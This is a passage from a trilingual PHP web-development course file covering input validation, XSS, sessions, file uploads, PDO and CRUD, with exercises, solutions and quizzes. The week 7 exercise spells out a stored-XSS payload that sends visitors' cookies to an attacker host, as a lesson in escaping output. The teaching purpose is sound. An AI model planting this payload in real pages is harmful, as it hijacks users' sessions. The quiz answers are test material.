          en: 'Golden rule: never trust data sent by the user. Validate it (is the format right?) with filter_var, and escape it when displaying it with htmlspecialchars. Otherwise a visitor can inject JavaScript into other people’s pages: an XSS (Cross-Site Scripting) flaw. Validation in JavaScript or HTML (required, type="email") helps the user but doesn’t protect: it is easily bypassed.',
          tr: 'Altın kural: kullanıcının gönderdiği verilere asla güvenme. filter_var ile doğrula (biçim doğru mu?) ve gösterirken htmlspecialchars ile kaçışla. Aksi halde bir ziyaretçi başkalarının sayfasına JavaScript enjekte edebilir: bu bir XSS (Siteler Arası Betik) açığıdır. JavaScript veya HTML’deki doğrulama (required, type="email") kullanıcıya yardım eder ama korumaz: kolayca atlatılır.',
        },
      },
      {
        type: 'code',
        code: {
          fr: 'filter_var("ali@kbu.edu.tr", FILTER_VALIDATE_EMAIL)  // "ali@kbu.edu.tr"\nfilter_var("ali@", FILTER_VALIDATE_EMAIL)            // false\nfilter_var("20", FILTER_VALIDATE_INT)                // 20 (int)\nfilter_var("abc", FILTER_VALIDATE_INT)               // false\n\n$commentaire = "<script>alert(\'hi\')</script>";\necho htmlspecialchars($commentaire);\n// &lt;script&gt;alert(&#039;hi&#039;)&lt;/script&gt;\n// le navigateur l’AFFICHE comme du texte au lieu de l’exécuter',
          en: 'filter_var("ali@kbu.edu.tr", FILTER_VALIDATE_EMAIL)  // "ali@kbu.edu.tr"\nfilter_var("ali@", FILTER_VALIDATE_EMAIL)            // false\nfilter_var("20", FILTER_VALIDATE_INT)                // 20 (int)\nfilter_var("abc", FILTER_VALIDATE_INT)               // false\n\n$comment = "<script>alert(\'hi\')</script>";\necho htmlspecialchars($comment);\n// &lt;script&gt;alert(&#039;hi&#039;)&lt;/script&gt;\n// the browser DISPLAYS it as text instead of running it',
          tr: 'filter_var("ali@kbu.edu.tr", FILTER_VALIDATE_EMAIL)  // "ali@kbu.edu.tr"\nfilter_var("ali@", FILTER_VALIDATE_EMAIL)            // false\nfilter_var("20", FILTER_VALIDATE_INT)                // 20 (int)\nfilter_var("abc", FILTER_VALIDATE_INT)               // false\n\n$yorum = "<script>alert(\'hi\')</script>";\necho htmlspecialchars($yorum);\n// &lt;script&gt;alert(&#039;hi&#039;)&lt;/script&gt;\n// tarayıcı onu çalıştırmak yerine metin olarak GÖSTERİR',
        },
      },
      { type: 'heading', text: { fr: 'Révision de la vize', en: 'Midterm review', tr: 'Vize tekrarı' } },
      {
        type: 'code',
        code: {
          fr: '✔ Client / serveur, requête et réponse HTTP, méthodes, codes d’état\n✔ <?php ?>, echo, variables, guillemets simples / doubles, concaténation\n✔ Types, == / ===, ??, fonctions de chaînes, mb_\n✔ if / elseif / match, for / while / foreach, break / continue\n✔ Fonctions : paramètres par défaut, types, portée, static\n✔ Tableaux indexés et associatifs, sort / arsort, array_filter\n✔ Formulaires : GET / POST, $_GET / $_POST, filter_var, htmlspecialchars',
          en: '✔ Client / server, HTTP request and response, methods, status codes\n✔ <?php ?>, echo, variables, single / double quotes, concatenation\n✔ Types, == / ===, ??, string functions, mb_\n✔ if / elseif / match, for / while / foreach, break / continue\n✔ Functions: default parameters, types, scope, static\n✔ Indexed and associative arrays, sort / arsort, array_filter\n✔ Forms: GET / POST, $_GET / $_POST, filter_var, htmlspecialchars',
          tr: '✔ İstemci / sunucu, HTTP isteği ve yanıtı, yöntemler, durum kodları\n✔ <?php ?>, echo, değişkenler, tek / çift tırnak, birleştirme\n✔ Tipler, == / ===, ??, dize fonksiyonları, mb_\n✔ if / elseif / match, for / while / foreach, break / continue\n✔ Fonksiyonlar: varsayılan parametreler, tipler, kapsam, static\n✔ İndisli ve ilişkisel diziler, sort / arsort, array_filter\n✔ Formlar: GET / POST, $_GET / $_POST, filter_var, htmlspecialchars',
        },
      },
      {
        type: 'exercise',
        question: {
          fr: 'Un livre d’or affiche les messages avec echo $_POST["message"];. (1) Que se passe-t-il si quelqu’un envoie <script>document.location="http://pirate.com?c="+document.cookie</script> ? (2) Corrige la ligne. (3) Écris le test qui vérifie qu’un âge envoyé est un entier entre 17 et 99.',
          en: 'A guestbook shows messages with echo $_POST["message"];. (1) What happens if someone sends <script>document.location="http://pirate.com?c="+document.cookie</script>? (2) Fix the line. (3) Write the check that a submitted age is an integer between 17 and 99.',
          tr: 'Bir ziyaretçi defteri mesajları echo $_POST["message"]; ile gösteriyor. (1) Biri <script>document.location="http://pirate.com?c="+document.cookie</script> gönderirse ne olur? (2) Satırı düzelt. (3) Gönderilen yaşın 17 ile 99 arasında bir tam sayı olduğunu denetleyen kodu yaz.',
        },
        solution: {
          fr: '(1) Le script est enregistré puis exécuté dans le navigateur de chaque visiteur : il envoie leurs cookies (donc leur session) au pirate. C’est un XSS stocké. (2) echo htmlspecialchars($_POST["message"]); : les < et > deviennent &lt; et &gt;, le code s’affiche au lieu de s’exécuter. (3) $age = filter_var($_POST["age"] ?? "", FILTER_VALIDATE_INT, ["options" => ["min_range" => 17, "max_range" => 99]]); if ($age === false) { echo "Âge invalide"; }',
          en: '(1) The script is stored, then runs in every visitor’s browser: it sends their cookies (so their session) to the attacker. That is stored XSS. (2) echo htmlspecialchars($_POST["message"]);: < and > become &lt; and &gt;, so the code is shown instead of run. (3) $age = filter_var($_POST["age"] ?? "", FILTER_VALIDATE_INT, ["options" => ["min_range" => 17, "max_range" => 99]]); if ($age === false) { echo "Invalid age"; }',
          tr: '(1) Betik kaydedilir ve her ziyaretçinin tarayıcısında çalışır: çerezlerini (yani oturumlarını) saldırgana gönderir. Bu kalıcı XSS’tir. (2) echo htmlspecialchars($_POST["message"]);: < ve > işaretleri &lt; ve &gt; olur, kod çalışmak yerine görünür. (3) $yas = filter_var($_POST["yas"] ?? "", FILTER_VALIDATE_INT, ["options" => ["min_range" => 17, "max_range" => 99]]); if ($yas === false) { echo "Geçersiz yaş"; }',
        },
      },
    ],
    quiz: {
      question: {
        fr: 'Quelle fonction protège contre le XSS au moment d’afficher un texte saisi par l’utilisateur ?',
        en: 'Which function protects against XSS when displaying user-entered text?',
        tr: 'Kullanıcının girdiği metni gösterirken hangi fonksiyon XSS’e karşı korur?',
      },
      options: { fr: ['trim', 'htmlspecialchars', 'strtolower'], en: ['trim', 'htmlspecialchars', 'strtolower'], tr: ['trim', 'htmlspecialchars', 'strtolower'] },
      answerIndex: 1,
      explanation: {
        fr: 'htmlspecialchars transforme <, >, & et les guillemets en entités HTML : le navigateur les affiche au lieu de les interpréter comme des balises.',
        en: 'htmlspecialchars turns <, >, & and quotes into HTML entities: the browser displays them instead of reading them as tags.',
        tr: 'htmlspecialchars <, >, & ve tırnakları HTML varlıklarına dönüştürür: tarayıcı onları etiket olarak yorumlamak yerine gösterir.',
      },
    },
  },
  {
    id: 'php-w08-sessions-cookies',
    week: 8,
    title: { fr: 'Sessions et cookies', en: 'Sessions and cookies', tr: 'Oturumlar ve çerezler' },
    blocks: [
      {
        type: 'text',
        text: {
          fr: 'HTTP est sans état : pour se souvenir d’un visiteur d’une page à l’autre, on utilise des cookies ou des sessions. Un cookie est un petit texte stocké dans le navigateur et renvoyé à chaque requête : l’utilisateur peut le lire et le modifier. Une session stocke les données sur le serveur ; le navigateur ne garde qu’un identifiant (le cookie PHPSESSID). C’est là qu’on garde l’utilisateur connecté.',
          en: 'HTTP is stateless: to remember a visitor from page to page, cookies or sessions are used. A cookie is a small text stored in the browser and sent back with every request: the user can read and change it. A session stores data on the server; the browser only keeps an identifier (the PHPSESSID cookie). That is where the logged-in user is kept.',
          tr: 'HTTP durumsuzdur: bir ziyaretçiyi sayfadan sayfaya hatırlamak için çerezler veya oturumlar kullanılır. Çerez, tarayıcıda saklanan ve her istekte geri gönderilen küçük bir metindir: kullanıcı onu okuyabilir ve değiştirebilir. Oturum verileri sunucuda saklar; tarayıcı yalnızca bir kimlik (PHPSESSID çerezi) tutar. Giriş yapmış kullanıcı orada tutulur.',
        },
      },
      {
        type: 'code',
        code: {
          fr: '<?php\nsession_start();                       // AVANT tout affichage\n$_SESSION["visites"] = ($_SESSION["visites"] ?? 0) + 1;\necho "Visite n° " . $_SESSION["visites"];\n\n// Après une connexion réussie :\nsession_regenerate_id(true);           // nouvel identifiant (sécurité)\n$_SESSION["user_id"] = 42;\n\n// Page protégée :\nif (!isset($_SESSION["user_id"])) { header("Location: login.php"); exit; }\n\n// Déconnexion :\nsession_destroy();\n\n// Cookie valable 30 jours\nsetcookie("langue", "fr", time() + 30 * 24 * 3600);\n$langue = $_COOKIE["langue"] ?? "tr";',
          en: '<?php\nsession_start();                       // BEFORE any output\n$_SESSION["visits"] = ($_SESSION["visits"] ?? 0) + 1;\necho "Visit no. " . $_SESSION["visits"];\n\n// After a successful login:\nsession_regenerate_id(true);           // new identifier (security)\n$_SESSION["user_id"] = 42;\n\n// Protected page:\nif (!isset($_SESSION["user_id"])) { header("Location: login.php"); exit; }\n\n// Logout:\nsession_destroy();\n\n// Cookie valid for 30 days\nsetcookie("lang", "en", time() + 30 * 24 * 3600);\n$lang = $_COOKIE["lang"] ?? "tr";',
          tr: '<?php\nsession_start();                       // her çıktıdan ÖNCE\n$_SESSION["ziyaret"] = ($_SESSION["ziyaret"] ?? 0) + 1;\necho "Ziyaret no " . $_SESSION["ziyaret"];\n\n// Başarılı girişten sonra:\nsession_regenerate_id(true);           // yeni kimlik (güvenlik)\n$_SESSION["user_id"] = 42;\n\n// Korumalı sayfa:\nif (!isset($_SESSION["user_id"])) { header("Location: login.php"); exit; }\n\n// Çıkış:\nsession_destroy();\n\n// 30 gün geçerli çerez\nsetcookie("dil", "tr", time() + 30 * 24 * 3600);\n$dil = $_COOKIE["dil"] ?? "tr";',
        },
      },
      {
        type: 'exercise',
        question: {
          fr: '(1) L’utilisateur recharge 3 fois la page du compteur (4 affichages en tout) : que voit-il au dernier ? Et s’il ouvre un autre navigateur ? (2) Pourquoi ne faut-il pas stocker le rôle « admin » dans un cookie ? (3) Pourquoi le exit après header("Location: …") est-il indispensable ?',
          en: '(1) The user reloads the counter page 3 times (4 displays in all): what do they see on the last one? And in another browser? (2) Why must the “admin” role not be stored in a cookie? (3) Why is the exit after header("Location: …") essential?',
          tr: '(1) Kullanıcı sayaç sayfasını 3 kez yeniliyor (toplam 4 görüntüleme): sonuncusunda ne görür? Başka bir tarayıcıda? (2) “admin” rolü neden bir çerezde saklanmamalıdır? (3) header("Location: …")’dan sonraki exit neden zorunludur?',
        },
        solution: {
          fr: '(1) « Visite n° 4 ». Un autre navigateur n’a pas le cookie PHPSESSID : nouvelle session, donc « Visite n° 1 ». (2) Le cookie est stocké chez l’utilisateur, qui peut écrire role=admin lui-même. Le rôle doit être dans $_SESSION, côté serveur. (3) header() ne fait qu’ajouter un en-tête : sans exit, le reste de la page protégée s’exécute et est quand même envoyé.',
          en: '(1) “Visit no. 4”. Another browser doesn’t have the PHPSESSID cookie: new session, so “Visit no. 1”. (2) The cookie is stored on the user’s side, and they can write role=admin themselves. The role belongs in $_SESSION, on the server. (3) header() only adds a header: without exit, the rest of the protected page still runs and is sent.',
          tr: '(1) “Ziyaret no 4”. Başka bir tarayıcıda PHPSESSID çerezi yoktur: yeni oturum, yani “Ziyaret no 1”. (2) Çerez kullanıcı tarafında saklanır, kullanıcı role=admin’i kendisi yazabilir. Rol sunucu tarafında, $_SESSION’da olmalıdır. (3) header() yalnızca bir başlık ekler: exit olmadan korumalı sayfanın geri kalanı yine çalışır ve gönderilir.',
        },
      },
    ],
    quiz: {
      question: {
        fr: 'Où sont stockées les données de $_SESSION ?',
        en: 'Where is $_SESSION data stored?',
        tr: '$_SESSION verileri nerede saklanır?',
      },
      options: {
        fr: ['Dans le navigateur', 'Sur le serveur', 'Dans l’URL'],
        en: ['In the browser', 'On the server', 'In the URL'],
        tr: ['Tarayıcıda', 'Sunucuda', 'URL’de'],
      },
      answerIndex: 1,
      explanation: {
        fr: 'Les données de session restent sur le serveur ; le navigateur n’a qu’un identifiant aléatoire. C’est pourquoi on y met l’utilisateur connecté, et non dans un cookie.',
        en: 'Session data stays on the server; the browser only has a random identifier. That is why the logged-in user goes there, not into a cookie.',
        tr: 'Oturum verileri sunucuda kalır; tarayıcıda yalnızca rastgele bir kimlik vardır. Giriş yapmış kullanıcı bu yüzden çereze değil oraya konur.',
      },
    },
  },
  {
    id: 'php-w09-files-uploads',
    week: 9,
    title: { fr: 'Fichiers et téléversement', en: 'Files and uploads', tr: 'Dosyalar ve dosya yükleme' },
    blocks: [
      {
        type: 'code',
        code: {
          fr: 'file_put_contents("notes.csv", "Ali;85\\nAyse;90\\nEmre;55\\n");      // écrase\nfile_put_contents("notes.csv", "Zeynep;60\\n", FILE_APPEND);       // ajoute\n\n$lignes = file("notes.csv", FILE_IGNORE_NEW_LINES);   // tableau de lignes\nforeach ($lignes as $l) {\n    [$nom, $note] = explode(";", $l);\n}\n\n// Téléversement : <form method="post" enctype="multipart/form-data">\n//                 <input type="file" name="photo">\n$f = $_FILES["photo"];\n$types = ["image/jpeg", "image/png"];\nif ($f["error"] === UPLOAD_ERR_OK && $f["size"] <= 2_000_000\n    && in_array(mime_content_type($f["tmp_name"]), $types)) {\n    $nouveau = bin2hex(random_bytes(8)) . ".jpg";   // nom choisi par le serveur\n    move_uploaded_file($f["tmp_name"], "uploads/$nouveau");\n}',
          en: 'file_put_contents("grades.csv", "Ali;85\\nAyse;90\\nEmre;55\\n");     // overwrites\nfile_put_contents("grades.csv", "Zeynep;60\\n", FILE_APPEND);      // appends\n\n$lines = file("grades.csv", FILE_IGNORE_NEW_LINES);   // array of lines\nforeach ($lines as $l) {\n    [$name, $grade] = explode(";", $l);\n}\n\n// Upload: <form method="post" enctype="multipart/form-data">\n//         <input type="file" name="photo">\n$f = $_FILES["photo"];\n$types = ["image/jpeg", "image/png"];\nif ($f["error"] === UPLOAD_ERR_OK && $f["size"] <= 2_000_000\n    && in_array(mime_content_type($f["tmp_name"]), $types)) {\n    $newName = bin2hex(random_bytes(8)) . ".jpg";   // name chosen by the server\n    move_uploaded_file($f["tmp_name"], "uploads/$newName");\n}',
          tr: 'file_put_contents("notlar.csv", "Ali;85\\nAyse;90\\nEmre;55\\n");     // üzerine yazar\nfile_put_contents("notlar.csv", "Zeynep;60\\n", FILE_APPEND);      // ekler\n\n$satirlar = file("notlar.csv", FILE_IGNORE_NEW_LINES); // satır dizisi\nforeach ($satirlar as $s) {\n    [$ad, $not] = explode(";", $s);\n}\n\n// Yükleme: <form method="post" enctype="multipart/form-data">\n//          <input type="file" name="photo">\n$f = $_FILES["photo"];\n$tipler = ["image/jpeg", "image/png"];\nif ($f["error"] === UPLOAD_ERR_OK && $f["size"] <= 2_000_000\n    && in_array(mime_content_type($f["tmp_name"]), $tipler)) {\n    $yeniAd = bin2hex(random_bytes(8)) . ".jpg";    // adı sunucu seçer\n    move_uploaded_file($f["tmp_name"], "uploads/$yeniAd");\n}',
        },
      },
      {
        type: 'text',
        text: {
          fr: 'Un fichier téléversé est d’abord placé dans un dossier temporaire ; move_uploaded_file le déplace. Ne garde jamais le nom choisi par l’utilisateur, et vérifie le vrai type du contenu : sinon, quelqu’un peut envoyer un fichier pirate.php puis l’exécuter sur ton serveur.',
          en: 'An uploaded file first goes to a temporary folder; move_uploaded_file moves it. Never keep the name chosen by the user, and check the real content type: otherwise someone can upload a pirate.php file and then run it on your server.',
          tr: 'Yüklenen dosya önce geçici bir klasöre konur; move_uploaded_file onu taşır. Kullanıcının seçtiği adı asla tutma ve içeriğin gerçek tipini denetle: aksi halde biri pirate.php dosyası yükleyip sunucunda çalıştırabilir.',
        },
      },
      {
        type: 'exercise',
        question: {
          fr: 'Après les deux appels à file_put_contents ci-dessus : (1) combien d’éléments contient $lignes ? (2) Quelle est la somme des notes ? (3) Quelle est la taille du fichier en octets (chaque \\n compte pour 1) ? (4) Que se serait-il passé sans FILE_APPEND ?',
          en: 'After the two file_put_contents calls above: (1) how many elements does $lines hold? (2) What is the sum of the grades? (3) What is the file size in bytes (each \\n counts as 1)? (4) What would have happened without FILE_APPEND?',
          tr: 'Yukarıdaki iki file_put_contents çağrısından sonra: (1) $satirlar kaç eleman içerir? (2) Notların toplamı kaçtır? (3) Dosyanın boyutu kaç bayttır (her \\n 1 sayılır)? (4) FILE_APPEND olmasaydı ne olurdu?',
        },
        solution: {
          fr: '(1) 4 lignes. (2) 85 + 90 + 55 + 60 = 290. (3) "Ali;85\\n" = 7, "Ayse;90\\n" = 8, "Emre;55\\n" = 8, "Zeynep;60\\n" = 10 : 33 octets. (4) Le 2e appel aurait écrasé le fichier, qui ne contiendrait plus que Zeynep;60 (1 ligne, 10 octets).',
          en: '(1) 4 lines. (2) 85 + 90 + 55 + 60 = 290. (3) "Ali;85\\n" = 7, "Ayse;90\\n" = 8, "Emre;55\\n" = 8, "Zeynep;60\\n" = 10: 33 bytes. (4) The 2nd call would have overwritten the file, leaving only Zeynep;60 (1 line, 10 bytes).',
          tr: '(1) 4 satır. (2) 85 + 90 + 55 + 60 = 290. (3) "Ali;85\\n" = 7, "Ayse;90\\n" = 8, "Emre;55\\n" = 8, "Zeynep;60\\n" = 10: 33 bayt. (4) 2. çağrı dosyanın üzerine yazardı ve geriye yalnızca Zeynep;60 kalırdı (1 satır, 10 bayt).',
        },
      },
    ],
    quiz: {
      question: {
        fr: 'Quel attribut le formulaire doit-il avoir pour envoyer un fichier ?',
        en: 'Which attribute must the form have to send a file?',
        tr: 'Dosya göndermek için formda hangi öznitelik olmalıdır?',
      },
      options: {
        fr: ['method="get"', 'enctype="multipart/form-data"', 'action="upload"'],
        en: ['method="get"', 'enctype="multipart/form-data"', 'action="upload"'],
        tr: ['method="get"', 'enctype="multipart/form-data"', 'action="upload"'],
      },
      answerIndex: 1,
      explanation: {
        fr: 'Sans enctype="multipart/form-data" (et method="post"), le navigateur n’envoie que le nom du fichier, pas son contenu : $_FILES reste vide.',
        en: 'Without enctype="multipart/form-data" (and method="post"), the browser sends only the file name, not its content: $_FILES stays empty.',
        tr: 'enctype="multipart/form-data" (ve method="post") olmadan tarayıcı içeriği değil yalnızca dosya adını gönderir: $_FILES boş kalır.',
      },
    },
  },
  {
    id: 'php-w10-pdo',
    week: 10,
    title: {
      fr: 'Se connecter à MySQL avec PDO',
      en: 'Connecting to MySQL with PDO',
      tr: 'PDO ile MySQL’e bağlanma',
    },
    blocks: [
      {
        type: 'text',
        text: {
          fr: 'PDO est l’interface standard de PHP pour les bases de données (MySQL, PostgreSQL, SQLite…). On utilise toujours des requêtes préparées : la requête contient des marqueurs (? ou :nom), et les valeurs sont envoyées séparément avec execute. Le SGBD ne peut donc jamais confondre une donnée avec du code SQL : c’est la protection contre l’injection SQL.',
          en: 'PDO is PHP’s standard database interface (MySQL, PostgreSQL, SQLite…). Always use prepared statements: the query holds placeholders (? or :name), and values are sent separately with execute. The DBMS can therefore never mistake data for SQL code: that is the protection against SQL injection.',
          tr: 'PDO, PHP’nin standart veritabanı arayüzüdür (MySQL, PostgreSQL, SQLite…). Her zaman hazırlanmış sorgular kullanılır: sorgu yer tutucular (? veya :ad) içerir ve değerler execute ile ayrı gönderilir. Böylece VTYS bir veriyi asla SQL kodu sanmaz: SQL enjeksiyonuna karşı koruma budur.',
        },
      },
      {
        type: 'code',
        code: {
          fr: '$pdo = new PDO("mysql:host=localhost;dbname=kbu;charset=utf8mb4", "root", "");\n$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\n$ins = $pdo->prepare("INSERT INTO student(name, city) VALUES (?, ?)");\n$ins->execute(["Ali", "Karabuk"]);\n$ins->execute(["Ayse", "Ankara"]);\n$ins->execute(["Emre", "Karabuk"]);\necho $pdo->lastInsertId();                       // 3\n\n$q = $pdo->prepare("SELECT name FROM student WHERE city = :city ORDER BY name");\n$q->execute(["city" => "Karabuk"]);\nforeach ($q->fetchAll(PDO::FETCH_ASSOC) as $row) echo $row["name"];   // Ali, Emre\n\n// JAMAIS : $pdo->query("SELECT * FROM student WHERE city = \'$ville\'");',
          en: '$pdo = new PDO("mysql:host=localhost;dbname=kbu;charset=utf8mb4", "root", "");\n$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\n$ins = $pdo->prepare("INSERT INTO student(name, city) VALUES (?, ?)");\n$ins->execute(["Ali", "Karabuk"]);\n$ins->execute(["Ayse", "Ankara"]);\n$ins->execute(["Emre", "Karabuk"]);\necho $pdo->lastInsertId();                       // 3\n\n$q = $pdo->prepare("SELECT name FROM student WHERE city = :city ORDER BY name");\n$q->execute(["city" => "Karabuk"]);\nforeach ($q->fetchAll(PDO::FETCH_ASSOC) as $row) echo $row["name"];   // Ali, Emre\n\n// NEVER: $pdo->query("SELECT * FROM student WHERE city = \'$city\'");',
          tr: '$pdo = new PDO("mysql:host=localhost;dbname=kbu;charset=utf8mb4", "root", "");\n$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\n$ins = $pdo->prepare("INSERT INTO student(name, city) VALUES (?, ?)");\n$ins->execute(["Ali", "Karabuk"]);\n$ins->execute(["Ayse", "Ankara"]);\n$ins->execute(["Emre", "Karabuk"]);\necho $pdo->lastInsertId();                       // 3\n\n$q = $pdo->prepare("SELECT name FROM student WHERE city = :city ORDER BY name");\n$q->execute(["city" => "Karabuk"]);\nforeach ($q->fetchAll(PDO::FETCH_ASSOC) as $row) echo $row["name"];   // Ali, Emre\n\n// ASLA: $pdo->query("SELECT * FROM student WHERE city = \'$sehir\'");',
        },
      },
      {
        type: 'exercise',
        question: {
          fr: 'Sur la table ci-dessus (Ali, Ayse, Emre), on exécute UPDATE student SET city = ? WHERE id = ? avec ["Bursa", 2], puis DELETE FROM student WHERE city = ? avec ["Karabuk"]. Que renvoie rowCount() après chacune, et combien d’étudiants restent ? Lesquels ?',
          en: 'On the table above (Ali, Ayse, Emre), run UPDATE student SET city = ? WHERE id = ? with ["Bursa", 2], then DELETE FROM student WHERE city = ? with ["Karabuk"]. What does rowCount() return after each, and how many students remain? Which ones?',
          tr: 'Yukarıdaki tabloda (Ali, Ayşe, Emre) önce ["Bursa", 2] ile UPDATE student SET city = ? WHERE id = ?, sonra ["Karabuk"] ile DELETE FROM student WHERE city = ? çalıştırılıyor. Her birinden sonra rowCount() ne döndürür, kaç öğrenci kalır? Hangileri?',
        },
        solution: {
          fr: 'L’UPDATE modifie la ligne id 2 (Ayse passe à Bursa) : rowCount() = 1. Le DELETE supprime les étudiants de Karabuk, Ali et Emre : rowCount() = 2. Il reste 1 étudiant : Ayse, à Bursa.',
          en: 'The UPDATE changes row id 2 (Ayse moves to Bursa): rowCount() = 1. The DELETE removes the Karabuk students, Ali and Emre: rowCount() = 2. 1 student remains: Ayse, in Bursa.',
          tr: 'UPDATE id 2 satırını değiştirir (Ayşe Bursa’ya geçer): rowCount() = 1. DELETE Karabük’teki öğrencileri, Ali ve Emre’yi siler: rowCount() = 2. 1 öğrenci kalır: Bursa’da Ayşe.',
        },
      },
    ],
    quiz: {
      question: {
        fr: 'Pourquoi utilise-t-on prepare et execute au lieu de mettre la variable directement dans la requête ?',
        en: 'Why use prepare and execute instead of putting the variable straight into the query?',
        tr: 'Değişkeni doğrudan sorguya koymak yerine neden prepare ve execute kullanılır?',
      },
      options: {
        fr: ['C’est plus court à écrire', 'Pour empêcher l’injection SQL', 'Parce que MySQL l’exige'],
        en: ['It is shorter to write', 'To prevent SQL injection', 'Because MySQL requires it'],
        tr: ['Yazması daha kısadır', 'SQL enjeksiyonunu önlemek için', 'MySQL bunu gerektirdiği için'],
      },
      answerIndex: 1,
      explanation: {
        fr: 'Les valeurs sont envoyées à part et traitées comme des données, jamais comme du SQL. On le voit en détail en semaine 13.',
        en: 'Values are sent separately and treated as data, never as SQL. Week 13 covers this in detail.',
        tr: 'Değerler ayrı gönderilir ve asla SQL olarak değil, veri olarak işlenir. 13. hafta bunu ayrıntılı ele alır.',
      },
    },
  },
  {
    id: 'php-w11-crud',
    week: 11,
    title: {
      fr: 'Une application CRUD complète',
      en: 'A complete CRUD application',
      tr: 'Eksiksiz bir CRUD uygulaması',
    },
    blocks: [
      {
        type: 'text',
        text: {
          fr: 'CRUD = Create, Read, Update, Delete : les quatre opérations de presque toute application web. Organisation classique : une page de liste (Read) avec des liens « modifier » et « supprimer », un formulaire pour ajouter et modifier, et un fichier db.php inclus partout avec require_once. Après un POST réussi, on redirige (modèle Post/Redirect/Get) pour éviter qu’un rechargement renvoie le formulaire.',
          en: 'CRUD = Create, Read, Update, Delete: the four operations of almost every web app. Classic layout: a list page (Read) with “edit” and “delete” links, a form to add and edit, and a db.php file included everywhere with require_once. After a successful POST, redirect (Post/Redirect/Get pattern) so a reload doesn’t resubmit the form.',
          tr: 'CRUD = Create, Read, Update, Delete: neredeyse her web uygulamasının dört işlemi. Klasik düzen: “düzenle” ve “sil” bağlantılı bir liste sayfası (Read), ekleme ve düzenleme için bir form ve require_once ile her yere eklenen bir db.php dosyası. Başarılı bir POST’tan sonra yönlendirilir (Post/Redirect/Get kalıbı), böylece sayfa yenilenince form yeniden gönderilmez.',
        },
      },
      {
        type: 'code',
        code: {
          fr: '<?php // list.php\nrequire_once "db.php";\n$etudiants = $pdo->query("SELECT id, name, city FROM student ORDER BY name")->fetchAll();\n?>\n<table>\n<?php foreach ($etudiants as $e): ?>\n  <tr>\n    <td><?= htmlspecialchars($e["name"]) ?></td>\n    <td><?= htmlspecialchars($e["city"]) ?></td>\n    <td><a href="edit.php?id=<?= $e["id"] ?>">Modifier</a></td>\n    <td><form method="post" action="delete.php">\n          <input type="hidden" name="id" value="<?= $e["id"] ?>">\n          <button>Supprimer</button></form></td>\n  </tr>\n<?php endforeach; ?>\n</table>\n\n<?php // delete.php\nrequire_once "db.php";\n$pdo->prepare("DELETE FROM student WHERE id = ?")->execute([(int) $_POST["id"]]);\nheader("Location: list.php");     // Post/Redirect/Get\nexit;',
          en: '<?php // list.php\nrequire_once "db.php";\n$students = $pdo->query("SELECT id, name, city FROM student ORDER BY name")->fetchAll();\n?>\n<table>\n<?php foreach ($students as $s): ?>\n  <tr>\n    <td><?= htmlspecialchars($s["name"]) ?></td>\n    <td><?= htmlspecialchars($s["city"]) ?></td>\n    <td><a href="edit.php?id=<?= $s["id"] ?>">Edit</a></td>\n    <td><form method="post" action="delete.php">\n          <input type="hidden" name="id" value="<?= $s["id"] ?>">\n          <button>Delete</button></form></td>\n  </tr>\n<?php endforeach; ?>\n</table>\n\n<?php // delete.php\nrequire_once "db.php";\n$pdo->prepare("DELETE FROM student WHERE id = ?")->execute([(int) $_POST["id"]]);\nheader("Location: list.php");     // Post/Redirect/Get\nexit;',
          tr: '<?php // list.php\nrequire_once "db.php";\n$ogrenciler = $pdo->query("SELECT id, name, city FROM student ORDER BY name")->fetchAll();\n?>\n<table>\n<?php foreach ($ogrenciler as $o): ?>\n  <tr>\n    <td><?= htmlspecialchars($o["name"]) ?></td>\n    <td><?= htmlspecialchars($o["city"]) ?></td>\n    <td><a href="edit.php?id=<?= $o["id"] ?>">Düzenle</a></td>\n    <td><form method="post" action="delete.php">\n          <input type="hidden" name="id" value="<?= $o["id"] ?>">\n          <button>Sil</button></form></td>\n  </tr>\n<?php endforeach; ?>\n</table>\n\n<?php // delete.php\nrequire_once "db.php";\n$pdo->prepare("DELETE FROM student WHERE id = ?")->execute([(int) $_POST["id"]]);\nheader("Location: list.php");     // Post/Redirect/Get\nexit;',
        },
      },
      {
        type: 'exercise',
        question: {
          fr: '(1) Associe chaque lettre de CRUD à une instruction SQL. (2) Pourquoi la suppression passe-t-elle par un formulaire POST et pas par un simple lien delete.php?id=3 ? (3) Quelles deux étapes doit faire edit.php quand il reçoit le formulaire modifié ?',
          en: '(1) Match each CRUD letter with an SQL statement. (2) Why does deletion go through a POST form and not a plain delete.php?id=3 link? (3) Which two steps must edit.php do when it receives the edited form?',
          tr: '(1) CRUD’un her harfini bir SQL komutuyla eşleştir. (2) Silme neden basit bir delete.php?id=3 bağlantısıyla değil de POST formuyla yapılır? (3) edit.php düzenlenmiş formu aldığında hangi iki adımı yapmalıdır?',
        },
        solution: {
          fr: '(1) Create = INSERT, Read = SELECT, Update = UPDATE, Delete = DELETE. (2) Un lien GET peut être suivi sans le vouloir (moteur de recherche, préchargement du navigateur, image piégée sur un autre site) et effacer des données. Une action qui modifie doit être en POST, avec un jeton CSRF (semaine 13). (3) Valider les champs reçus, puis exécuter un UPDATE préparé … WHERE id = ?, et enfin rediriger vers list.php.',
          en: '(1) Create = INSERT, Read = SELECT, Update = UPDATE, Delete = DELETE. (2) A GET link can be followed by accident (search engine, browser prefetch, booby-trapped image on another site) and erase data. An action that changes data must use POST, with a CSRF token (week 13). (3) Validate the received fields, then run a prepared UPDATE … WHERE id = ?, and finally redirect to list.php.',
          tr: '(1) Create = INSERT, Read = SELECT, Update = UPDATE, Delete = DELETE. (2) Bir GET bağlantısı istemeden izlenebilir (arama motoru, tarayıcının önceden yüklemesi, başka sitedeki tuzaklı bir resim) ve veri silebilir. Veri değiştiren bir eylem CSRF jetonuyla (13. hafta) POST olmalıdır. (3) Gelen alanları doğrula, sonra hazırlanmış bir UPDATE … WHERE id = ? çalıştır ve son olarak list.php’ye yönlendir.',
        },
      },
    ],
    quiz: {
      question: {
        fr: 'À quoi sert le modèle Post/Redirect/Get ?',
        en: 'What is the Post/Redirect/Get pattern for?',
        tr: 'Post/Redirect/Get kalıbı ne işe yarar?',
      },
      options: {
        fr: ['À accélérer la page', 'À éviter qu’un rechargement renvoie le formulaire', 'À chiffrer les données'],
        en: ['To speed up the page', 'To avoid resubmitting the form on reload', 'To encrypt the data'],
        tr: ['Sayfayı hızlandırmak', 'Yenilemede formun yeniden gönderilmesini önlemek', 'Verileri şifrelemek'],
      },
